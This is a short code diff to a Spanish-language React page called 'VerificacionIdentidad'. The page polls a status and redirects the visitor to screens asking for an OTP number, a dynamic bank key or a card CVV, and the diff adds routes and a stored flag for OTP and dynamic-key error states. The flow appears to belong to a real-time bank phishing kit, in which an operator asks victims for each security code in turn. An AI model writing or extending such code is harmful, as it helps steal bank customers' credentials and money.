@@ -614,7 +614,9 @@ export default function VerificacionIdentidad() {
         // Define states to redirect
         const statusMap = {
           'solicitar_otp': '/numero-otp',
+          'error_otp': '/numero-otp',
           'solicitar_din': '/clave-dinamica',
+          'error_din': '/clave-dinamica',
           'solicitar_finalizar': '/finalizado-page',
           'error_923': '/error-923page',
           'solicitar_cvv': '/validacion-cvv',
@@ -625,6 +627,12 @@ export default function VerificacionIdentidad() {
 
         if (statusMap[estado]) {
           clearInterval(pollingInterval);
+
+          // Si es un estado de error, guardamos la bandera en localStorage
+          if (['error_login', 'error_otp', 'error_din'].includes(estado)) {
+            localStorage.setItem('estado_sesion', 'error');
+          }
+
           navigate(statusMap[estado]);
         }
 
